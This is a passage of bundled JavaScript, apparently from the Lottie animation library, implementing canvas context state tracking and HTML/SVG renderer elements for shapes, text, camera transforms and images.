            ((this.currentLineCap = i), (this.stack[this.cArrPos].lineCap = i));
        }),
        (CVContextData.prototype.lineJoin = function (i) {
          this.stack[this.cArrPos].lineJoin !== i &&
            ((this.currentLineJoin = i),
            (this.stack[this.cArrPos].lineJoin = i));
        }),
        (CVContextData.prototype.miterLimit = function (i) {
          this.stack[this.cArrPos].miterLimit !== i &&
            ((this.currentMiterLimit = i),
            (this.stack[this.cArrPos].miterLimit = i));
        }),
        (CVContextData.prototype.transform = function (i) {
          this.transformMat.cloneFromProps(i);
          var a = this.cTr;
          this.transformMat.multiply(a),
            a.cloneFromProps(this.transformMat.props);
          var o = a.props;
          this.nativeContext.setTransform(o[0], o[1], o[4], o[5], o[12], o[13]);
        }),
        (CVContextData.prototype.opacity = function (i) {
          var a = this.stack[this.cArrPos].opacity;
          (a *= i < 0 ? 0 : i),
            this.stack[this.cArrPos].opacity !== a &&
              (this.currentOpacity !== i &&
                ((this.nativeContext.globalAlpha = i),
                (this.currentOpacity = i)),
              (this.stack[this.cArrPos].opacity = a));
        }),
        (CVContextData.prototype.fill = function (i) {
          this.appliedFillStyle !== this.currentFillStyle &&
            ((this.appliedFillStyle = this.currentFillStyle),
            (this.nativeContext.fillStyle = this.appliedFillStyle)),
            this.nativeContext.fill(i);
        }),
        (CVContextData.prototype.fillRect = function (i, a, o, s) {
          this.appliedFillStyle !== this.currentFillStyle &&
            ((this.appliedFillStyle = this.currentFillStyle),
            (this.nativeContext.fillStyle = this.appliedFillStyle)),
            this.nativeContext.fillRect(i, a, o, s);
        }),
        (CVContextData.prototype.stroke = function () {
          this.appliedStrokeStyle !== this.currentStrokeStyle &&
            ((this.appliedStrokeStyle = this.currentStrokeStyle),
            (this.nativeContext.strokeStyle = this.appliedStrokeStyle)),
            this.appliedLineWidth !== this.currentLineWidth &&
              ((this.appliedLineWidth = this.currentLineWidth),
              (this.nativeContext.lineWidth = this.appliedLineWidth)),
            this.appliedLineCap !== this.currentLineCap &&
              ((this.appliedLineCap = this.currentLineCap),
              (this.nativeContext.lineCap = this.appliedLineCap)),
            this.appliedLineJoin !== this.currentLineJoin &&
              ((this.appliedLineJoin = this.currentLineJoin),
              (this.nativeContext.lineJoin = this.appliedLineJoin)),
            this.appliedMiterLimit !== this.currentMiterLimit &&
              ((this.appliedMiterLimit = this.currentMiterLimit),
              (this.nativeContext.miterLimit = this.appliedMiterLimit)),
            this.nativeContext.stroke();
        });
      function CVCompElement(i, a, o) {
        (this.completeLayers = !1),
          (this.layers = i.layers),
          (this.pendingElements = []),
          (this.elements = createSizedArray(this.layers.length)),
          this.initElement(i, a, o),
          (this.tm = i.tm
            ? PropertyFactory.getProp(this, i.tm, 0, a.frameRate, this)
            : { _placeholder: !0 });
      }
      extendPrototype(
        [CanvasRendererBase, ICompElement, CVBaseElement],
        CVCompElement
      ),
        (CVCompElement.prototype.renderInnerContent = function () {
          var i = this.canvasContext;
          i.beginPath(),
            i.moveTo(0, 0),
            i.lineTo(this.data.w, 0),
            i.lineTo(this.data.w, this.data.h),
            i.lineTo(0, this.data.h),
            i.lineTo(0, 0),
            i.clip();
          var a,
            o = this.layers.length;
          for (a = o - 1; a >= 0; a -= 1)
            (this.completeLayers || this.elements[a]) &&
              this.elements[a].renderFrame();
        }),
        (CVCompElement.prototype.destroy = function () {
          var i,
            a = this.layers.length;
          for (i = a - 1; i >= 0; i -= 1)
            this.elements[i] && this.elements[i].destroy();
          (this.layers = null), (this.elements = null);
        }),
        (CVCompElement.prototype.createComp = function (i) {
          return new CVCompElement(i, this.globalData, this);
        });
      function CanvasRenderer(i, a) {
        (this.animationItem = i),
          (this.renderConfig = {
            clearCanvas: a && a.clearCanvas !== void 0 ? a.clearCanvas : !0,
            context: (a && a.context) || null,
            progressiveLoad: (a && a.progressiveLoad) || !1,
            preserveAspectRatio:
              (a && a.preserveAspectRatio) || "xMidYMid meet",
            imagePreserveAspectRatio:
              (a && a.imagePreserveAspectRatio) || "xMidYMid slice",
            contentVisibility: (a && a.contentVisibility) || "visible",
            className: (a && a.className) || "",
            id: (a && a.id) || "",
            runExpressions:
              !a || a.runExpressions === void 0 || a.runExpressions,
          }),
          (this.renderConfig.dpr = (a && a.dpr) || 1),
          this.animationItem.wrapper &&
            (this.renderConfig.dpr =
              (a && a.dpr) || window.devicePixelRatio || 1),
          (this.renderedFrame = -1),
          (this.globalData = {
            frameNum: -1,
            _mdf: !1,
            renderConfig: this.renderConfig,
            currentGlobalAlpha: -1,
          }),
          (this.contextData = new CVContextData()),
          (this.elements = []),
          (this.pendingElements = []),
          (this.transformMat = new Matrix()),
          (this.completeLayers = !1),
          (this.rendererType = "canvas"),
          this.renderConfig.clearCanvas &&
            ((this.ctxTransform = this.contextData.transform.bind(
              this.contextData
            )),
            (this.ctxOpacity = this.contextData.opacity.bind(this.contextData)),
            (this.ctxFillStyle = this.contextData.fillStyle.bind(
              this.contextData
            )),
            (this.ctxStrokeStyle = this.contextData.strokeStyle.bind(
              this.contextData
            )),
            (this.ctxLineWidth = this.contextData.lineWidth.bind(
              this.contextData
            )),
            (this.ctxLineCap = this.contextData.lineCap.bind(this.contextData)),
            (this.ctxLineJoin = this.contextData.lineJoin.bind(
              this.contextData
            )),
            (this.ctxMiterLimit = this.contextData.miterLimit.bind(
              this.contextData
            )),
            (this.ctxFill = this.contextData.fill.bind(this.contextData)),
            (this.ctxFillRect = this.contextData.fillRect.bind(
              this.contextData
            )),
            (this.ctxStroke = this.contextData.stroke.bind(this.contextData)),
            (this.save = this.contextData.save.bind(this.contextData)));
      }
      extendPrototype([CanvasRendererBase], CanvasRenderer),
        (CanvasRenderer.prototype.createComp = function (i) {
          return new CVCompElement(i, this.globalData, this);
        });
      function HBaseElement() {}
      (HBaseElement.prototype = {
        checkBlendMode: function () {},
        initRendererElement: function () {
          (this.baseElement = createTag(this.data.tg || "div")),
            this.data.hasMask
              ? ((this.svgElement = createNS("svg")),
                (this.layerElement = createNS("g")),
                (this.maskedElement = this.layerElement),
                this.svgElement.appendChild(this.layerElement),
                this.baseElement.appendChild(this.svgElement))
              : (this.layerElement = this.baseElement),
            styleDiv(this.baseElement);
        },
        createContainerElements: function () {
          (this.renderableEffectsManager = new CVEffects(this)),
            (this.transformedElement = this.baseElement),
            (this.maskedElement = this.layerElement),
            this.data.ln && this.layerElement.setAttribute("id", this.data.ln),
            this.data.cl &&
              this.layerElement.setAttribute("class", this.data.cl),
            this.data.bm !== 0 && this.setBlendMode();
        },
        renderElement: function () {
          var a = this.transformedElement ? this.transformedElement.style : {};
          if (this.finalTransform._matMdf) {
            var o = this.finalTransform.mat.toCSS();
            (a.transform = o), (a.webkitTransform = o);
          }
          this.finalTransform._opMdf &&
            (a.opacity = this.finalTransform.mProp.o.v);
        },
        renderFrame: function () {
          this.data.hd ||
            this.hidden ||
            (this.renderTransform(),
            this.renderRenderable(),
            this.renderElement(),
            this.renderInnerContent(),
            this._isFirstFrame && (this._isFirstFrame = !1));
        },
        destroy: function () {
          (this.layerElement = null),
            (this.transformedElement = null),
            this.matteElement && (this.matteElement = null),
            this.maskManager &&
              (this.maskManager.destroy(), (this.maskManager = null));
        },
        createRenderableComponents: function () {
          this.maskManager = new MaskElement(this.data, this, this.globalData);
        },
        addEffects: function () {},
        setMatte: function () {},
      }),
        (HBaseElement.prototype.getBaseElement =
          SVGBaseElement.prototype.getBaseElement),
        (HBaseElement.prototype.destroyBaseElement =
          HBaseElement.prototype.destroy),
        (HBaseElement.prototype.buildElementParenting =
          BaseRenderer.prototype.buildElementParenting);
      function HSolidElement(i, a, o) {
        this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          HBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableDOMElement,
        ],
        HSolidElement
      ),
        (HSolidElement.prototype.createContent = function () {
          var i;
          this.data.hasMask
            ? ((i = createNS("rect")),
              i.setAttribute("width", this.data.sw),
              i.setAttribute("height", this.data.sh),
              i.setAttribute("fill", this.data.sc),
              this.svgElement.setAttribute("width", this.data.sw),
              this.svgElement.setAttribute("height", this.data.sh))
            : ((i = createTag("div")),
              (i.style.width = this.data.sw + "px"),
              (i.style.height = this.data.sh + "px"),
              (i.style.backgroundColor = this.data.sc)),
            this.layerElement.appendChild(i);
        });
      function HShapeElement(i, a, o) {
        (this.shapes = []),
          (this.shapesData = i.shapes),
          (this.stylesList = []),
          (this.shapeModifiers = []),
          (this.itemsData = []),
          (this.processedElements = []),
          (this.animatedContents = []),
          (this.shapesContainer = createNS("g")),
          this.initElement(i, a, o),
          (this.prevViewData = []),
          (this.currentBBox = { x: 999999, y: -999999, h: 0, w: 0 });
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          HSolidElement,
          SVGShapeElement,
          HBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableElement,
        ],
        HShapeElement
      ),
        (HShapeElement.prototype._renderShapeFrame =
          HShapeElement.prototype.renderInnerContent),
        (HShapeElement.prototype.createContent = function () {
          var i;
          if (((this.baseElement.style.fontSize = 0), this.data.hasMask))
            this.layerElement.appendChild(this.shapesContainer),
              (i = this.svgElement);
          else {
            i = createNS("svg");
            var a = this.comp.data ? this.comp.data : this.globalData.compSize;
            i.setAttribute("width", a.w),
              i.setAttribute("height", a.h),
              i.appendChild(this.shapesContainer),
              this.layerElement.appendChild(i);
          }
          this.searchShapes(
            this.shapesData,
            this.itemsData,
            this.prevViewData,
            this.shapesContainer,
            0,
            [],
            !0
          ),
            this.filterUniqueShapes(),
            (this.shapeCont = i);
        }),
        (HShapeElement.prototype.getTransformedPoint = function (i, a) {
          var o,
            s = i.length;
          for (o = 0; o < s; o += 1)
            a = i[o].mProps.v.applyToPointArray(a[0], a[1], 0);
          return a;
        }),
        (HShapeElement.prototype.calculateShapeBoundingBox = function (i, a) {
          var o = i.sh.v,
            s = i.transformers,
            tt,
            nt = o._length,
            ot,
            st,
            ft,
            ht;
          if (!(nt <= 1)) {
            for (tt = 0; tt < nt - 1; tt += 1)
              (ot = this.getTransformedPoint(s, o.v[tt])),
                (st = this.getTransformedPoint(s, o.o[tt])),
                (ft = this.getTransformedPoint(s, o.i[tt + 1])),
                (ht = this.getTransformedPoint(s, o.v[tt + 1])),
                this.checkBounds(ot, st, ft, ht, a);
            o.c &&
              ((ot = this.getTransformedPoint(s, o.v[tt])),
              (st = this.getTransformedPoint(s, o.o[tt])),
              (ft = this.getTransformedPoint(s, o.i[0])),
              (ht = this.getTransformedPoint(s, o.v[0])),
              this.checkBounds(ot, st, ft, ht, a));
          }
        }),
        (HShapeElement.prototype.checkBounds = function (i, a, o, s, tt) {
          this.getBoundsOfCurve(i, a, o, s);
          var nt = this.shapeBoundingBox;
          (tt.x = bmMin(nt.left, tt.x)),
            (tt.xMax = bmMax(nt.right, tt.xMax)),
            (tt.y = bmMin(nt.top, tt.y)),
            (tt.yMax = bmMax(nt.bottom, tt.yMax));
        }),
        (HShapeElement.prototype.shapeBoundingBox = {
          left: 0,
          right: 0,
          top: 0,
          bottom: 0,
        }),
        (HShapeElement.prototype.tempBoundingBox = {
          x: 0,
          xMax: 0,
          y: 0,
          yMax: 0,
          width: 0,
          height: 0,
        }),
        (HShapeElement.prototype.getBoundsOfCurve = function (i, a, o, s) {
          for (
            var tt = [
                [i[0], s[0]],
                [i[1], s[1]],
              ],
              nt,
              ot,
              st,
              ft,
              ht,
              gt,
              St,
              vt = 0;
            vt < 2;
            ++vt
          )
            (ot = 6 * i[vt] - 12 * a[vt] + 6 * o[vt]),
              (nt = -3 * i[vt] + 9 * a[vt] - 9 * o[vt] + 3 * s[vt]),
              (st = 3 * a[vt] - 3 * i[vt]),
              (ot |= 0),
              (nt |= 0),
              (st |= 0),
              (nt === 0 && ot === 0) ||
                (nt === 0
                  ? ((ft = -st / ot),
                    ft > 0 &&
                      ft < 1 &&
                      tt[vt].push(this.calculateF(ft, i, a, o, s, vt)))
                  : ((ht = ot * ot - 4 * st * nt),
                    ht >= 0 &&
                      ((gt = (-ot + bmSqrt(ht)) / (2 * nt)),
                      gt > 0 &&
                        gt < 1 &&
                        tt[vt].push(this.calculateF(gt, i, a, o, s, vt)),
                      (St = (-ot - bmSqrt(ht)) / (2 * nt)),
                      St > 0 &&
                        St < 1 &&
                        tt[vt].push(this.calculateF(St, i, a, o, s, vt)))));
          (this.shapeBoundingBox.left = bmMin.apply(null, tt[0])),
            (this.shapeBoundingBox.top = bmMin.apply(null, tt[1])),
            (this.shapeBoundingBox.right = bmMax.apply(null, tt[0])),
            (this.shapeBoundingBox.bottom = bmMax.apply(null, tt[1]));
        }),
        (HShapeElement.prototype.calculateF = function (i, a, o, s, tt, nt) {
          return (
            bmPow(1 - i, 3) * a[nt] +
            3 * bmPow(1 - i, 2) * i * o[nt] +
            3 * (1 - i) * bmPow(i, 2) * s[nt] +
            bmPow(i, 3) * tt[nt]
          );
        }),
        (HShapeElement.prototype.calculateBoundingBox = function (i, a) {
          var o,
            s = i.length;
          for (o = 0; o < s; o += 1)
            i[o] && i[o].sh
              ? this.calculateShapeBoundingBox(i[o], a)
              : i[o] && i[o].it
              ? this.calculateBoundingBox(i[o].it, a)
              : i[o] &&
                i[o].style &&
                i[o].w &&
                this.expandStrokeBoundingBox(i[o].w, a);
        }),
        (HShapeElement.prototype.expandStrokeBoundingBox = function (i, a) {
          var o = 0;
          if (i.keyframes) {
            for (var s = 0; s < i.keyframes.length; s += 1) {
              var tt = i.keyframes[s].s;
              tt > o && (o = tt);
            }
            o *= i.mult;
          } else o = i.v * i.mult;
          (a.x -= o), (a.xMax += o), (a.y -= o), (a.yMax += o);
        }),
        (HShapeElement.prototype.currentBoxContains = function (i) {
          return (
            this.currentBBox.x <= i.x &&
            this.currentBBox.y <= i.y &&
            this.currentBBox.width + this.currentBBox.x >= i.x + i.width &&
            this.currentBBox.height + this.currentBBox.y >= i.y + i.height
          );
        }),
        (HShapeElement.prototype.renderInnerContent = function () {
          if (
            (this._renderShapeFrame(),
            !this.hidden && (this._isFirstFrame || this._mdf))
          ) {
            var i = this.tempBoundingBox,
              a = 999999;
            if (
              ((i.x = a),
              (i.xMax = -a),
              (i.y = a),
              (i.yMax = -a),
              this.calculateBoundingBox(this.itemsData, i),
              (i.width = i.xMax < i.x ? 0 : i.xMax - i.x),
              (i.height = i.yMax < i.y ? 0 : i.yMax - i.y),
              this.currentBoxContains(i))
            )
              return;
            var o = !1;
            if (
              (this.currentBBox.w !== i.width &&
                ((this.currentBBox.w = i.width),
                this.shapeCont.setAttribute("width", i.width),
                (o = !0)),
              this.currentBBox.h !== i.height &&
                ((this.currentBBox.h = i.height),
                this.shapeCont.setAttribute("height", i.height),
                (o = !0)),
              o || this.currentBBox.x !== i.x || this.currentBBox.y !== i.y)
            ) {
              (this.currentBBox.w = i.width),
                (this.currentBBox.h = i.height),
                (this.currentBBox.x = i.x),
                (this.currentBBox.y = i.y),
                this.shapeCont.setAttribute(
                  "viewBox",
                  this.currentBBox.x +
                    " " +
                    this.currentBBox.y +
                    " " +
                    this.currentBBox.w +
                    " " +
                    this.currentBBox.h
                );
              var s = this.shapeCont.style,
                tt =
                  "translate(" +
                  this.currentBBox.x +
                  "px," +
                  this.currentBBox.y +
                  "px)";
              (s.transform = tt), (s.webkitTransform = tt);
            }
          }
        });
      function HTextElement(i, a, o) {
        (this.textSpans = []),
          (this.textPaths = []),
          (this.currentBBox = { x: 999999, y: -999999, h: 0, w: 0 }),
          (this.renderType = "svg"),
          (this.isMasked = !1),
          this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          HBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableDOMElement,
          ITextElement,
        ],
        HTextElement
      ),
        (HTextElement.prototype.createContent = function () {
          if (((this.isMasked = this.checkMasks()), this.isMasked)) {
            (this.renderType = "svg"),
              (this.compW = this.comp.data.w),
              (this.compH = this.comp.data.h),
              this.svgElement.setAttribute("width", this.compW),
              this.svgElement.setAttribute("height", this.compH);
            var i = createNS("g");
            this.maskedElement.appendChild(i), (this.innerElem = i);
          } else
            (this.renderType = "html"), (this.innerElem = this.layerElement);
          this.checkParenting();
        }),
        (HTextElement.prototype.buildNewText = function () {
          var i = this.textProperty.currentData;
          this.renderedLetters = createSizedArray(i.l ? i.l.length : 0);
          var a = this.innerElem.style,
            o = i.fc ? this.buildColor(i.fc) : "rgba(0,0,0,0)";
          (a.fill = o),
            (a.color = o),
            i.sc &&
              ((a.stroke = this.buildColor(i.sc)),
              (a.strokeWidth = i.sw + "px"));
          var s = this.globalData.fontManager.getFontByName(i.f);
          if (!this.globalData.fontManager.chars)
            if (
              ((a.fontSize = i.finalSize + "px"),
              (a.lineHeight = i.finalSize + "px"),
              s.fClass)
            )
              this.innerElem.className = s.fClass;
            else {
              a.fontFamily = s.fFamily;
              var tt = i.fWeight,
                nt = i.fStyle;
              (a.fontStyle = nt), (a.fontWeight = tt);
            }
          var ot,
            st,
            ft = i.l;
          st = ft.length;
          var ht,
            gt,
            St,
            vt = this.mHelper,
            _t,
            Et = "",
            Ct = 0;
          for (ot = 0; ot < st; ot += 1) {
            if (
              (this.globalData.fontManager.chars
                ? (this.textPaths[Ct]
                    ? (ht = this.textPaths[Ct])
                    : ((ht = createNS("path")),
                      ht.setAttribute("stroke-linecap", lineCapEnum[1]),
                      ht.setAttribute("stroke-linejoin", lineJoinEnum[2]),
                      ht.setAttribute("stroke-miterlimit", "4")),
                  this.isMasked ||
                    (this.textSpans[Ct]
                      ? ((gt = this.textSpans[Ct]), (St = gt.children[0]))
                      : ((gt = createTag("div")),
                        (gt.style.lineHeight = 0),
                        (St = createNS("svg")),
                        St.appendChild(ht),
                        styleDiv(gt))))
                : this.isMasked
                ? (ht = this.textPaths[Ct]
                    ? this.textPaths[Ct]
                    : createNS("text"))
                : this.textSpans[Ct]
                ? ((gt = this.textSpans[Ct]), (ht = this.textPaths[Ct]))
                : ((gt = createTag("span")),
                  styleDiv(gt),
                  (ht = createTag("span")),
                  styleDiv(ht),
                  gt.appendChild(ht)),
              this.globalData.fontManager.chars)
            ) {
              var Pt = this.globalData.fontManager.getCharData(
                  i.finalText[ot],
                  s.fStyle,
                  this.globalData.fontManager.getFontByName(i.f).fFamily
                ),
                bt;
              if (
                (Pt ? (bt = Pt.data) : (bt = null),
                vt.reset(),
                bt &&
                  bt.shapes &&
                  bt.shapes.length &&
                  ((_t = bt.shapes[0].it),
                  vt.scale(i.finalSize / 100, i.finalSize / 100),
                  (Et = this.createPathShape(vt, _t)),
                  ht.setAttribute("d", Et)),
                this.isMasked)
              )
                this.innerElem.appendChild(ht);
              else {
                if ((this.innerElem.appendChild(gt), bt && bt.shapes)) {
                  document.body.appendChild(St);
                  var xt = St.getBBox();
                  St.setAttribute("width", xt.width + 2),
                    St.setAttribute("height", xt.height + 2),
                    St.setAttribute(
                      "viewBox",
                      xt.x -
                        1 +
                        " " +
                        (xt.y - 1) +
                        " " +
                        (xt.width + 2) +
                        " " +
                        (xt.height + 2)
                    );
                  var yt = St.style,
                    wt = "translate(" + (xt.x - 1) + "px," + (xt.y - 1) + "px)";
                  (yt.transform = wt),
                    (yt.webkitTransform = wt),
                    (ft[ot].yOffset = xt.y - 1);
                } else
                  St.setAttribute("width", 1), St.setAttribute("height", 1);
                gt.appendChild(St);
              }
            } else if (
              ((ht.textContent = ft[ot].val),
              ht.setAttributeNS(
                "http://www.w3.org/XML/1998/namespace",
                "xml:space",
                "preserve"
              ),
              this.isMasked)
            )
              this.innerElem.appendChild(ht);
            else {
              this.innerElem.appendChild(gt);
              var $t = ht.style,
                kt = "translate3d(0," + -i.finalSize / 1.2 + "px,0)";
              ($t.transform = kt), ($t.webkitTransform = kt);
            }
            this.isMasked
              ? (this.textSpans[Ct] = ht)
              : (this.textSpans[Ct] = gt),
              (this.textSpans[Ct].style.display = "block"),
              (this.textPaths[Ct] = ht),
              (Ct += 1);
          }
          for (; Ct < this.textSpans.length; )
            (this.textSpans[Ct].style.display = "none"), (Ct += 1);
        }),
        (HTextElement.prototype.renderInnerContent = function () {
          this.validateText();
          var i;
          if (this.data.singleShape) {
            if (!this._isFirstFrame && !this.lettersChangedFlag) return;
            if (this.isMasked && this.finalTransform._matMdf) {
              this.svgElement.setAttribute(
                "viewBox",
                -this.finalTransform.mProp.p.v[0] +
                  " " +
                  -this.finalTransform.mProp.p.v[1] +
                  " " +
                  this.compW +
                  " " +
                  this.compH
              ),
                (i = this.svgElement.style);
              var a =
                "translate(" +
                -this.finalTransform.mProp.p.v[0] +
                "px," +
                -this.finalTransform.mProp.p.v[1] +
                "px)";
              (i.transform = a), (i.webkitTransform = a);
            }
          }
          if (
            (this.textAnimator.getMeasures(
              this.textProperty.currentData,
              this.lettersChangedFlag
            ),
            !(
              !this.lettersChangedFlag && !this.textAnimator.lettersChangedFlag
            ))
          ) {
            var o,
              s,
              tt = 0,
              nt = this.textAnimator.renderedLetters,
              ot = this.textProperty.currentData.l;
            s = ot.length;
            var st, ft, ht;
            for (o = 0; o < s; o += 1)
              ot[o].n
                ? (tt += 1)
                : ((ft = this.textSpans[o]),
                  (ht = this.textPaths[o]),
                  (st = nt[tt]),
                  (tt += 1),
                  st._mdf.m &&
                    (this.isMasked
                      ? ft.setAttribute("transform", st.m)
                      : ((ft.style.webkitTransform = st.m),
                        (ft.style.transform = st.m))),
                  (ft.style.opacity = st.o),
                  st.sw && st._mdf.sw && ht.setAttribute("stroke-width", st.sw),
                  st.sc && st._mdf.sc && ht.setAttribute("stroke", st.sc),
                  st.fc &&
                    st._mdf.fc &&
                    (ht.setAttribute("fill", st.fc), (ht.style.color = st.fc)));
            if (
              this.innerElem.getBBox &&
              !this.hidden &&
              (this._isFirstFrame || this._mdf)
            ) {
              var gt = this.innerElem.getBBox();
              this.currentBBox.w !== gt.width &&
                ((this.currentBBox.w = gt.width),
                this.svgElement.setAttribute("width", gt.width)),
                this.currentBBox.h !== gt.height &&
                  ((this.currentBBox.h = gt.height),
                  this.svgElement.setAttribute("height", gt.height));
              var St = 1;
              if (
                this.currentBBox.w !== gt.width + St * 2 ||
                this.currentBBox.h !== gt.height + St * 2 ||
                this.currentBBox.x !== gt.x - St ||
                this.currentBBox.y !== gt.y - St
              ) {
                (this.currentBBox.w = gt.width + St * 2),
                  (this.currentBBox.h = gt.height + St * 2),
                  (this.currentBBox.x = gt.x - St),
                  (this.currentBBox.y = gt.y - St),
                  this.svgElement.setAttribute(
                    "viewBox",
                    this.currentBBox.x +
                      " " +
                      this.currentBBox.y +
                      " " +
                      this.currentBBox.w +
                      " " +
                      this.currentBBox.h
                  ),
                  (i = this.svgElement.style);
                var vt =
                  "translate(" +
                  this.currentBBox.x +
                  "px," +
                  this.currentBBox.y +
                  "px)";
                (i.transform = vt), (i.webkitTransform = vt);
              }
            }
          }
        });
      function HCameraElement(i, a, o) {
        this.initFrame(), this.initBaseData(i, a, o), this.initHierarchy();
        var s = PropertyFactory.getProp;
        if (
          ((this.pe = s(this, i.pe, 0, 0, this)),
          i.ks.p.s
            ? ((this.px = s(this, i.ks.p.x, 1, 0, this)),
              (this.py = s(this, i.ks.p.y, 1, 0, this)),
              (this.pz = s(this, i.ks.p.z, 1, 0, this)))
            : (this.p = s(this, i.ks.p, 1, 0, this)),
          i.ks.a && (this.a = s(this, i.ks.a, 1, 0, this)),
          i.ks.or.k.length && i.ks.or.k[0].to)
        ) {
          var tt,
            nt = i.ks.or.k.length;
          for (tt = 0; tt < nt; tt += 1)
            (i.ks.or.k[tt].to = null), (i.ks.or.k[tt].ti = null);
        }
        (this.or = s(this, i.ks.or, 1, degToRads, this)),
          (this.or.sh = !0),
          (this.rx = s(this, i.ks.rx, 0, degToRads, this)),
          (this.ry = s(this, i.ks.ry, 0, degToRads, this)),
          (this.rz = s(this, i.ks.rz, 0, degToRads, this)),
          (this.mat = new Matrix()),
          (this._prevMat = new Matrix()),
          (this._isFirstFrame = !0),
          (this.finalTransform = { mProp: this });
      }
      extendPrototype(
        [BaseElement, FrameElement, HierarchyElement],
        HCameraElement
      ),
        (HCameraElement.prototype.setup = function () {
          var i,
            a = this.comp.threeDElements.length,
            o,
            s,
            tt;
          for (i = 0; i < a; i += 1)
            if (((o = this.comp.threeDElements[i]), o.type === "3d")) {
              (s = o.perspectiveElem.style), (tt = o.container.style);
              var nt = this.pe.v + "px",
                ot = "0px 0px 0px",
                st = "matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)";
              (s.perspective = nt),
                (s.webkitPerspective = nt),
                (tt.transformOrigin = ot),
                (tt.mozTransformOrigin = ot),
                (tt.webkitTransformOrigin = ot),
                (s.transform = st),
                (s.webkitTransform = st);
            }
        }),
        (HCameraElement.prototype.createElements = function () {}),
        (HCameraElement.prototype.hide = function () {}),
        (HCameraElement.prototype.renderFrame = function () {
          var i = this._isFirstFrame,
            a,
            o;
          if (this.hierarchy)
            for (o = this.hierarchy.length, a = 0; a < o; a += 1)
              i = this.hierarchy[a].finalTransform.mProp._mdf || i;
          if (
            i ||
            this.pe._mdf ||
            (this.p && this.p._mdf) ||
            (this.px && (this.px._mdf || this.py._mdf || this.pz._mdf)) ||
            this.rx._mdf ||
            this.ry._mdf ||
            this.rz._mdf ||
            this.or._mdf ||
            (this.a && this.a._mdf)
          ) {
            if ((this.mat.reset(), this.hierarchy))
              for (o = this.hierarchy.length - 1, a = o; a >= 0; a -= 1) {
                var s = this.hierarchy[a].finalTransform.mProp;
                this.mat.translate(-s.p.v[0], -s.p.v[1], s.p.v[2]),
                  this.mat
                    .rotateX(-s.or.v[0])
                    .rotateY(-s.or.v[1])
                    .rotateZ(s.or.v[2]),
                  this.mat.rotateX(-s.rx.v).rotateY(-s.ry.v).rotateZ(s.rz.v),
                  this.mat.scale(1 / s.s.v[0], 1 / s.s.v[1], 1 / s.s.v[2]),
                  this.mat.translate(s.a.v[0], s.a.v[1], s.a.v[2]);
              }
            if (
              (this.p
                ? this.mat.translate(-this.p.v[0], -this.p.v[1], this.p.v[2])
                : this.mat.translate(-this.px.v, -this.py.v, this.pz.v),
              this.a)
            ) {
              var tt;
              this.p
                ? (tt = [
                    this.p.v[0] - this.a.v[0],
                    this.p.v[1] - this.a.v[1],
                    this.p.v[2] - this.a.v[2],
                  ])
                : (tt = [
                    this.px.v - this.a.v[0],
                    this.py.v - this.a.v[1],
                    this.pz.v - this.a.v[2],
                  ]);
              var nt = Math.sqrt(
                  Math.pow(tt[0], 2) + Math.pow(tt[1], 2) + Math.pow(tt[2], 2)
                ),
                ot = [tt[0] / nt, tt[1] / nt, tt[2] / nt],
                st = Math.sqrt(ot[2] * ot[2] + ot[0] * ot[0]),
                ft = Math.atan2(ot[1], st),
                ht = Math.atan2(ot[0], -ot[2]);
              this.mat.rotateY(ht).rotateX(-ft);
            }
            this.mat.rotateX(-this.rx.v).rotateY(-this.ry.v).rotateZ(this.rz.v),
              this.mat
                .rotateX(-this.or.v[0])
                .rotateY(-this.or.v[1])
                .rotateZ(this.or.v[2]),
              this.mat.translate(
                this.globalData.compSize.w / 2,
                this.globalData.compSize.h / 2,
                0
              ),
              this.mat.translate(0, 0, this.pe.v);
            var gt = !this._prevMat.equals(this.mat);
            if ((gt || this.pe._mdf) && this.comp.threeDElements) {
              o = this.comp.threeDElements.length;
              var St, vt, _t;
              for (a = 0; a < o; a += 1)
                if (((St = this.comp.threeDElements[a]), St.type === "3d")) {
                  if (gt) {
                    var Et = this.mat.toCSS();
                    (_t = St.container.style),
                      (_t.transform = Et),
                      (_t.webkitTransform = Et);
                  }
                  this.pe._mdf &&
                    ((vt = St.perspectiveElem.style),
                    (vt.perspective = this.pe.v + "px"),
                    (vt.webkitPerspective = this.pe.v + "px"));
                }
              this.mat.clone(this._prevMat);
            }
          }
          this._isFirstFrame = !1;
        }),
        (HCameraElement.prototype.prepareFrame = function (i) {
          this.prepareProperties(i, !0);
        }),
        (HCameraElement.prototype.destroy = function () {}),
        (HCameraElement.prototype.getBaseElement = function () {
          return null;
        });
      function HImageElement(i, a, o) {
        (this.assetData = a.getAssetData(i.refId)), this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          HBaseElement,
          HSolidElement,
          HierarchyElement,
          FrameElement,
          RenderableElement,
        ],
        HImageElement
      ),
        (HImageElement.prototype.createContent = function () {
          var i = this.globalData.getAssetsPath(this.assetData),
            a = new Image();
          this.data.hasMask
            ? ((this.imageElem = createNS("image")),
              this.imageElem.setAttribute("width", this.assetData.w + "px"),
              this.imageElem.setAttribute("height", this.assetData.h + "px"),
              this.imageElem.setAttributeNS(
                "http://www.w3.org/1999/xlink",
                "href",
                i
              ),
              this.layerElement.appendChild(this.imageElem),
              this.baseElement.setAttribute("width", this.assetData.w),
              this.baseElement.setAttribute("height", this.assetData.h))
            : this.layerElement.appendChild(a),
            (a.crossOrigin = "anonymous"),
            (a.src = i),
            this.data.ln && this.baseElement.setAttribute("id", this.data.ln);
        });
      function HybridRendererBase(i, a) {
        (this.animationItem = i),
          (this.layers = null),
          (this.renderedFrame = -1),
          (this.renderConfig = {
            className: (a && a.className) || "",
            imagePreserveAspectRatio:
              (a && a.imagePreserveAspectRatio) || "xMidYMid slice",
            hideOnTransparent: !(a && a.hideOnTransparent === !1),
            filterSize: {
              width: (a && a.filterSize && a.filterSize.width) || "400%",
              height: (a && a.filterSize && a.filterSize.height) || "400%",
              x: (a && a.filterSize && a.filterSize.x) || "-100%",
              y: (a && a.filterSize && a.filterSize.y) || "-100%",
            },
          }),
          (this.globalData = {
            _mdf: !1,
            frameNum: -1,
            renderConfig: this.renderConfig,
          }),
          (this.pendingElements = []),
          (this.elements = []),
          (this.threeDElements = []),
          (this.destroyed = !1),
